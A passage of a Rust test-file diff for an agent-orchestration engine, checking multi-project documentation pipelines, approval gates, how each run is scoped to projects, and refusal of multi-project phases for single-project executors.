+    h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": projects, "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: ostra_default_plugin::workflow(Category::Docs),
+    });
+    h
+}
+
+/// A survey of `a` and `b`: one page in each project's part and one page across them.
+fn wide_survey() -> Value {
+    let page = |id: &str, part: &str| json!({"id": id, "title": id, "group": "How it works", "covers": "It.", "part": part});
+    let item = |id: &str, sources: &[&str]| json!({"id": format!("{id}-item"), "name": id, "sources": sources, "owner": id});
+    json!({
+        "status": "ok", "step": "survey", "summary": "Surveyed.", "overview": "a serves orders, and b shows them.",
+        "part_overviews": [
+            {"part": "a", "overview": "a serves orders."},
+            {"part": "b", "overview": "b shows orders."},
+            {"part": "_cross", "overview": "How b calls a."}
+        ],
+        "pages": [page("orders", "a"), page("screens", "b"), page("flow", "_cross")],
+        "inventory": [
+            item("orders", &["@a/src/orders.rs"]),
+            item("screens", &["@b/ui/screens.tsx"]),
+            item("flow", &["@a/src/api.rs", "@b/ui/client.ts"])
+        ]
+    })
+}
+
+#[test]
+fn b10_one_pipeline_documents_every_project_of_the_session() {
+    let mut h = docs_wide(&["a", "b"]);
+    assert_eq!(h.summaries(), vec!["scan-docs a", "scan-docs b"]);
+    h.ev(scanned_wide("a", &["src"]));
+    assert_eq!(
+        h.summaries(),
+        vec!["scan-docs b"],
+        "the survey waits for every project's scan"
+    );
+    h.ev(scanned_wide("b", &["ui"]));
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-survey _session"],
+        "one survey for the session, not one per project"
+    );
+    let r = h.spawn_step("spawn documentation docs-survey _session");
+    assert_eq!(r.projects(), ["a", "b"], "Rule WD1: it works in both");
+    assert_eq!(r.session_dir, root());
+    assert_eq!(
+        r.inputs.ox().docs_parts,
+        ["a", "b"],
+        "the part across projects is implied"
+    );
+    assert_eq!(
+        r.inputs.ox().docs_reference,
+        Some(root().join("ostra-docs-drafts/_session/reference.md"))
+    );
+    h.run("spawn documentation docs-survey _session", wide_survey());
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn documentation docs _session/orders",
+            "spawn documentation docs _session/screens",
+            "spawn documentation docs _session/flow"
+        ]
+    );
+    for page in ["orders", "screens", "flow"] {
+        h.run(
+            &format!("spawn documentation docs _session/{page}"),
+            page_submit("a", page, CLEAN),
+        );
+    }
+    for page in ["orders", "screens", "flow"] {
+        h.run(
+            &format!("spawn fact-check docs-check _session/{page} round 1"),
+            check_submit(true),
+        );
+    }
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn documentation docs-synthesis _session round 1"],
+        "one synthesis pass over the pages of every part"
+    );
+    h.run(
+        "spawn documentation docs-synthesis _session round 1",
+        synthesis_submit(true, vec![]),
+    );
+    assert_eq!(h.summaries(), vec!["write-book a_b"]);
+    // Rule B11: the pages split into the parts the survey gave them.
+    let update = h.state().book_update();
+    let parts: Vec<(&str, usize, &str)> = update
+        .parts
+        .iter()
+        .map(|p| (p.project.as_str(), p.pages.len(), p.overview.as_str()))
+        .collect();
+    assert_eq!(
+        parts,
+        [
+            ("a", 1, "a serves orders."),
+            ("b", 1, "b shows orders."),
+            ("_cross", 1, "How b calls a.")
+        ]
+    );
+    let book = ostra_core::book::merge(None, "a_b", &update, chrono::Utc::now());
+    assert_eq!(
+        book.projects,
+        ["a", "b"],
+        "the part across projects is no project"
+    );
+    assert_eq!(book.parts[2].project, "_cross");
+    assert_eq!(book.parts[2].inventory[0].id, "flow-item");
+}
+
+#[test]
+fn b10_the_session_pipeline_has_one_rounds_gate() {
+    let mut h = docs_wide(&["a", "b"]);
+    h.ev(scanned_wide("a", &[]));
+    h.ev(scanned_wide("b", &[]));
+    h.run("spawn documentation docs-survey _session", wide_survey());
+    for page in ["orders", "screens", "flow"] {
+        h.run(
+            &format!("spawn documentation docs _session/{page}"),
+            page_submit("a", page, CLEAN),
+        );
+    }
+    for round in 1..=3 {
+        let pages: &[&str] = if round == 1 {
+            &["orders", "screens", "flow"]
+        } else {
+            &["flow"]
+        };
+        for page in pages {
+            h.run(
+                &format!("spawn fact-check docs-check _session/{page} round {round}"),
+                check_submit(true),
+            );
+        }
+        h.run(
+            &format!("spawn documentation docs-synthesis _session round {round}"),
+            synthesis_submit(false, vec![("flow", "Link to `orders.md`.")]),
+        );
+        if round < 3 {
+            h.run(
+                &format!("spawn documentation docs-revise _session/flow round {round}"),
+                page_submit("a", "flow", CLEAN),
+            );
+        }
+    }
+    h.open_gate("docs_rounds");
+    assert_eq!(
+        h.state().open_gates().count(),
+        1,
+        "one gate for the session"
+    );
+}
+
+#[test]
+fn b10_a_log_that_ran_docs_per_project_keeps_that_path() {
+    let mut h = docs_wide(&["a", "b"]);
+    h.ev(scanned("a", &[], &[]));
+    h.ev(scanned("b", &[], &[]));
+    assert_eq!(
+        h.summaries(),
+        vec![
+            "spawn documentation docs-survey a",
+            "spawn documentation docs-survey b"
+        ],
+        "a scan for one project's own pipeline keeps one pipeline per project"
+    );
+}
+
+#[test]
+fn b10_the_book_stage_writes_nothing_when_closing_chose_no_docs() {
+    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: ostra_default_plugin::workflow(Category::Implement),
+    });
+    h.run("spawn implementer", impl_submit(1, &["web/app.ts"]));
+    h.run("spawn code-reviewer", review(&[]));
+    h.command(CommandPurpose::Stage, "p");
+    h.accept();
+    h.command(CommandPurpose::Format, "p");
+    let g = h.open_gate("closing_gate");
+    h.answer(
+        &g,
+        GateAnswer::Closing {
+            items: vec![ClosingChoice {
+                project: "p".into(),
+                tests: false,
+                docs: false,
+            }],
+        },
+    );
+    assert_eq!(
+        h.state().ref_value("closing.docs", Some("project:p")),
+        json!(false)
+    );
+    assert_eq!(h.state().ref_value("docs.book", None), Value::Null);
+    assert_eq!(h.summaries(), vec!["judge completion"]);
+}
+
+// ------------------------------------------------------------------------------------------
+// WD1 to WD3: the projects each run works in, multi-project phases, and the executor limit.
+// ------------------------------------------------------------------------------------------
+
+#[test]
+fn wd1_session_runs_work_in_every_project_in_scope() {
+    let mut h = H::new(&["api", "web"], SessionOptions::default());
+    h.classify("IMPLEMENT", &["api", "web"]);
+    // Each research task works in its own project first, then in the rest of the scope.
+    assert_eq!(
+        h.spawn_step("spawn explore explore#0").projects(),
+        ["api", "web"]
+    );
+    assert_eq!(
+        h.spawn_step("spawn explore explore#1").projects(),
+        ["web", "api"]
+    );
+    let h = H::explored(&["api", "web"], SessionOptions::default());
+    assert_eq!(
+        h.spawn_step("spawn generate-spec").projects(),
+        ["api", "web"]
+    );
+}
+
+#[test]
+fn wd1_a_phase_run_works_in_its_phase_projects_only() {
+    let phases = json!([
+        phase(1, "api", &[], "Required"),
+        phase(2, "web", &[], "Required")
+    ]);
+    let h = H::plan_approved(&["api", "web"], phases, SessionOptions::default());
+    assert_eq!(
+        h.spawn_step("spawn implementer phase 1").projects(),
+        ["api"]
+    );
+    assert_eq!(
+        h.spawn_step("spawn implementer phase 2").projects(),
+        ["web"]
+    );
+}
+
+#[test]
+fn wd1_a_run_that_continues_keeps_its_projects() {
+    let mut h = H::explored(&["api", "web"], SessionOptions::default());
+    let (id, req) = h.start("spawn generate-spec");
+    assert_eq!(req.projects(), ["api", "web"]);
+    let st = h.state();
+    assert_eq!(st.executions[&id].projects, ["api", "web"]);
+    // Rule WD1: the planner gives a resumed run the projects it had, whatever the scope is now.
+    let resumed = SpawnRequest {
+        resumes: Some(id.clone()),
+        ..req
+    };
+    assert_eq!(st.work_projects(&resumed), ["api", "web"]);
+    h.finish(&id, ExecutionStatus::Ok, Some(spec_submit(0, 1)));
+}
+
+#[test]
+fn wd1_an_old_start_event_folds_as_one_project() {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    let id = ExecutionId::new();
+    let old = json!({
+        "type": "execution_started", "id": id, "agent": "implementer",
+        "purpose": {"kind": "quick_answer"}, "stage": "quick-answer", "project": "p",
+        "executor": "native", "model": "m", "params": null, "spawn_block": "",
+        "report_path": null, "resumes": null
+    });
+    let event: SessionEvent = serde_json::from_value(old).expect("an old event parses");
+    h.ev(event);
+    assert_eq!(h.state().executions[&id].projects, ["p"]);
+}
+
+#[test]
+fn wd2_a_phase_in_two_projects_runs_and_closes_in_both() {
+    let phases = json!([phase(1, "api, web", &[], "Required")]);
+    let options = SessionOptions {
+        tests: true,
+        docs: true,
+        ..Default::default()
+    };
+    let mut h = H::plan_approved(&["api", "web"], phases, options);
+    let st = h.state();
+    let info = &st.ext.os().phases[&1].info;
+    assert_eq!(
+        (info.project.as_str(), info.also.clone()),
+        ("api", vec!["web".to_string()])
+    );
+    assert_eq!(
+        h.spawn_step("spawn implementer phase 1").projects(),
+        ["api", "web"]
+    );
+    h.run(
+        "spawn implementer phase 1 initial",
+        impl_submit(1, &["src/a.rs"]),
+    );
+    assert_eq!(
+        h.spawn_step("spawn code-reviewer review phase 1")
+            .projects(),
+        ["api", "web"]
+    );
+    h.run("spawn code-reviewer review phase 1 #1", review(&[]));
+    h.command(CommandPurpose::Stage, "api");
+    h.accept();
+    // Rule WD2: each project the phase works in gets its own format step.
+    let s = h.summaries();
+    assert!(s.contains(&"command format api".to_string()), "{s:?}");
+    assert!(s.contains(&"command format web".to_string()), "{s:?}");
+    h.command(CommandPurpose::Format, "api");
+    h.command(CommandPurpose::Format, "web");
+    // One analysis for the phase, which works in both projects.
+    let epas: Vec<SpawnRequest> = h
+        .steps()
+        .into_iter()
+        .filter_map(|s| match s {
+            Step::Spawn(r) if matches!(r.purpose, ExecPurpose::Epa { .. }) => Some(*r),
+            _ => None,
+        })
+        .collect();
+    assert_eq!(epas.len(), 1, "{:?}", h.summaries());
+    assert_eq!(epas[0].projects(), ["api", "web"]);
+}
+
+#[test]
+fn wd2_a_phase_that_names_an_unknown_project_is_blocked() {
+    let phases = json!([phase(1, "api, nowhere", &[], "Required")]);
+    let h = H::plan_approved(&["api"], phases, SessionOptions::default());
+    let st = h.state();
+    assert!(matches!(
+        &st.ext.os().phases[&1].impl_loop.next,
+        ostra_default_plugin::data::LoopNext::Blocked { reason } if reason.contains("`nowhere`")
+    ));
+}
+
+fn codex_implementer(h: &mut H) {
+    h.ctx.executors.insert(
+        AgentName::Implementer,
+        ExecutorKind::Harness(ostra_core::HarnessKind::Codex),
+    );
+}
+
+#[test]
+fn wd3_the_plan_learns_the_limits_of_later_stages() {
+    let mut h = H::spec_approved(&["api", "web"], SessionOptions::default());
+    h.decide(
+        JudgeKind::Stakes,
+        None,
+        json!({"stakes": "high", "reason": "r"}),
+    );
+    codex_implementer(&mut h);
+    let x = h.spawn_step("spawn plan").inputs.ox();
+    assert!(
+        x.stage_limits
+            .contains(&"build: implementer (harness:codex) one project".to_string()),
+        "{:?}",
+        x.stage_limits
+    );
+    assert!(
+        x.stage_limits
+            .iter()
+            .any(|l| l.starts_with("review: ") && l.ends_with("(native) several projects")),
+        "{:?}",
+        x.stage_limits
+    );
+    assert_eq!(
+        x.single_project_agents,
+        [("implementer".to_string(), "harness:codex".to_string())]
+    );
+    // An all-native workspace has no single-project agent.
+    h.ctx.executors.clear();
+    assert!(
+        h.spawn_step("spawn plan")
+            .inputs
+            .ox()
+            .single_project_agents
+            .is_empty()
+    );
+}
+
+#[test]
+fn wd3_a_multi_project_phase_with_a_single_project_agent_is_refused() {
+    use ostra_engine::pipeline::Pipeline;
+    let params = json!({"single_project_agents": [["implementer", "harness:codex"]]});
+    let plan = plan_submit(json!([
+        phase(1, "api", &[], "Required"),
+        phase(2, "api, web", &[1], "Required")
+    ]));
+    let issues = ostra_default_plugin::OstraPipeline.check_submit(
+        ostra_core::Contract::Plan,
+        &plan,
+        &params,
+    );
+    assert_eq!(
+        issues,
+        [
+            "Split phase 2 into one phase per project and link them with Depends on: implementer runs on harness:codex and works in one project."
+        ]
+    );
+    // Native agents take the same plan.
+    let native = ostra_default_plugin::OstraPipeline.check_submit(
+        ostra_core::Contract::Plan,
+        &plan,
+        &json!({}),
+    );
+    assert!(native.is_empty());
+}
+
+#[test]
+fn wd3_the_fold_blocks_a_multi_project_phase_a_single_project_agent_would_run() {
+    let mut h = H::spec_approved(&["api", "web"], SessionOptions::default());
+    h.decide(
+        JudgeKind::Stakes,
+        None,
+        json!({"stakes": "high", "reason": "r"}),
+    );
+    let req = h.spawn_step("spawn plan");
+    let id = ExecutionId::new();
+    h.ev(SessionEvent::ExecutionStarted {
+        projects: req.recorded_projects(),
+        id: id.clone(),
+        agent: req.agent,
+        purpose: req.purpose.clone(),
+        stage: req.stage,
+        project: req.project.clone(),
+        executor: ExecutorKind::Native,
+        model: "mock:m".into(),
+        params: json!({"single_project_agents": [["implementer", "harness:codex"]]}),
+        spawn_block: String::new(),
+        report_path: None,
+        resumes: None,
+        contract: None,
+    });
+    h.finish(
+        &id,
+        ExecutionStatus::Ok,
+        Some(plan_submit(json!([phase(1, "api, web", &[], "Required")]))),
+    );
+    h.run(
+        "spawn fact-check fact-check-plan",
+        fact("PASS", "plan", &[]),
+    );
+    let g = h.open_gate("plan_approval");
+    h.answer(
+        &g,
+        GateAnswer::Approval {
+            approved: true,
+            feedback: None,
+        },
+    );
+    let st = h.state();
+    assert!(matches!(
+        &st.ext.os().phases[&1].impl_loop.next,
+        ostra_default_plugin::data::LoopNext::Blocked { reason } if reason.starts_with("Split phase 1 into one phase per project")
+    ));
 }
